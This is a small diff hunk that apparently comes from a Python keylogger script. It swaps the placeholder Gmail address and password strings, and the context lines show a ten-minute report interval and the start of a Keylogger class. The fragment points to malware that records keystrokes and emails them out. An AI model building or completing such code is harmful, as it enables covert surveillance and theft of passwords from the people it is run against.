@@ -7,8 +7,8 @@ from threading import Semaphore, Timer
 
 SEND_REPORT_EVERY = 10*60  # 10 minutes
 
-EMAIL_ADDRESS = "<yourgmailid>"
-EMAIL_PASSWORD = "<your password>"
+EMAIL_ADDRESS = "<your_gmail_id>"
+EMAIL_PASSWORD = "<your_password>"
 
 
 class Keylogger:
